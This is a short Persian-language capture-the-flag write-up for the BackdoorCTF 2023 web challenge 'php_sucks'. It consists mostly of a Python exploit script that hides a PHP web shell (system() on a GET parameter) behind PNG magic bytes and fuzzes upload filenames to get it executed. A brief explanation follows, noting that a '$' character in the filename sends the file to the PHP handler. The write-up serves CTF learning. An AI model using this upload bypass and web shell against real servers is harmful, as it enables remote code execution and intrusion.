---
tags:
  - BackdoorCTF
  - BackdoorCTF-2023
  - Web
  - PHP
  - Uploader_Bypass
---

[آرشیو چلنج](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/BackdoorCTF/2023/web/php_sucks)

```python
import re
import requests

file = io.BytesIO()
file.write(bytes.fromhex("89 50 4E 47 0D 0A 1A 0A"))
file.write(b'<?php echo system($_GET[\'ss\']); ?>')
for i in range(30, 40): # $ will work
    file.seek(0)
    name = 'ssss.php' + chr(i) + ".png"
    print(name)
    try:
        r = requests.post('http://34.132.132.69:8002/chal/upload.php', files=[('file', (name, file, 'image/jpeg'))], data={"submit": "", "name": "SS"}).content.decode()
        url = "http://34.132.132.69:8002/chal/" + re.search(r'<a href=\'(.*?)\' target=', r).group(1)
        print(i, requests.get(url).content)
    except:
        pass
```

یه کد بایپس آپلود ساده که بر اساس magic byte های png داره بایپس میکنه

سر اسم فایل آپلود شده یکم چالش بر انگیز بود که معلوم شد کاراکتر $ میتونه باعث بشه که فایل png بره سمت php handler و کد اکسپلویت اجرا بشه

از اونجایی که این کاراکتر بهمون وحی نشده، کد رو بصورت فازر نوشتم و پیداش کردم =))

!!! نویسنده
    [SafaSafari](https://twitter.com/SafaSafari3)$~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$تاریخ نگارش ۱۴۰۲/۱۲/۴